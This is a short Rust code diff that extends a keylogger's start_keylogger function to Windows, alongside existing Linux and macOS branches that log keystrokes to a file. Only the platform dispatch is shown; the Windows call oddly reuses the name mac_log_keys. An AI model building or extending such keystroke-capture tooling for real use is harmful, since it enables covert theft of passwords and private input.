@@ -4,7 +4,8 @@ use anyhow::Result;
 mod nix;
 #[cfg(target_os = "macos")]
 mod mac;
-
+#[cfg(target_os = "windows")]
+mod win;
 
 fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
     // let special_chars = "1234567890[]/=\\;',.`";
@@ -66,6 +67,10 @@ pub(crate) fn start_keylogger(log_file: String, timeout: u64) -> Result<()> {
     #[cfg(target_os = "macos")]
     {
         let _res = mac::mac_log_keys(log_file, timeout);    
+    }
+    #[cfg(target_os = "windows")]
+    {
+        let _res = win::mac_log_keys(log_file, timeout);    
     }
     Ok(())
 }
